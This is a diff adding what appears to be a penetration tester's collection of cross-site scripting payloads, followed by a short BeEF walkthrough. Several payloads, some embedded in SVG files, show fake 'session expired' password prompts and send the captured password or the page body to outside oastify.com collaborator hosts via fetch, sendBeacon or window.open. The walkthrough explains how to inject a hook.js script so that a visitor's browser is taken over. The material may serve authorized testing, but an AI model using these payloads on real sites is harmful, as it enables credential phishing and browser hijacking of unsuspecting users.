@@ -1,0 +1,64 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="640.000000pt" height="426.000000pt" viewBox="0 0 640.000000 426.000000"
+ preserveAspectRatio="xMidYMid meet">
+<script type="text/javascript"><![CDATA[
+javascript:var xssinput = prompt("Your session has timed out. Please re-enter your password to resume:");window.open("http://localhost/foo&p=" + xssinput);
+]]></script>
+</svg>
+
+----------------
+
+22q14em"onfocus="var abc=prompt('Session Expired. Please enter your password to log in again.');navigator.sendBeacon('http://mkatx18p1ae9309rxold.oastify.com/',document.body.innerHTML);"autofocus="bze4jg3pyc9
+
+----------------
+
+"><script>var password=prompt('Session Expire. Enter your password again');var formData=new FormData();formData.append('password',password);fetch('https://f7nvlw9byxgvdl970dr1ju7j.oastify.com',{method:'POST',mode:'no-cors',body:formData});</script>
+
+----------------
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="640.000000pt" height="426.000000pt" viewBox="0 0 640.000000 426.000000"
+ preserveAspectRatio="xMidYMid meet">
+<script type="text/javascript">
+let passme =prompt('Enter your password againYour session has timed out. Please re-enter your password to resume');
+fetch('https://lynsj5gondvwhls6p0dq1f.oastify.com',{method:'POST',body:passme});
+</script>
+</svg>
+
+---------------
+
+<script type="text/javascript"><![CDATA[
+    var xssinput = prompt('Your session has timed out. Please re-enter your password to resume');
+    if (xssinput) {
+      var url = 'https://2x0u9d4vqnol23brafz.oastify.com/foo?p=' + xssinput;
+      window.open(url);
+    }
+  </script>
+
+  -----------------------------------BeEF Exploitation--------------------------------
+
+The Browser Exploitation Framework is abbreviated as BeEF. It is a web browser-specific penetration testing tool. Because BeEF employs JavaScript, it is simpler for us to inject codes into XSS-vulnerable pages, and those scripts will be performed each time a user attempts to access the page.
+
+1. Start the BeEF service on Kali: Use the command "sudo beef-xss start" to initiate the BeEF service.
+
+2. Access the BeEF portal: Open the URL "http://localhost:port/ui/panel" in your browser to view the BeEF portal. If you encounter a certificate error, accept it or access the URL using the browser you're using for testing.
+
+3. Log in with your credentials.
+
+4. Add the payload to the working XSS parameter: Insert the following payload into the XSS parameter e.g: "><script src="https:<ip>:<port>hook.js" ></script>
+
+5. Open the page where the XSS payload will be executed.
+
+6. Monitor the response in the BeEF portal: Keep an eye on the response in the BeEF portal, which is accessed through the online browser.
+
+7. Execute the Alert box command: Look for the Alert box command in the commands section of the BeEF portal and execute it.
+
+8. The BeEF alert box appears in the exploited browser.
+
+9. Stop the BeEF service: After successfully completing the proof of concept (poc), stop the BeEF service using the command "sudo beef-xss-stop".
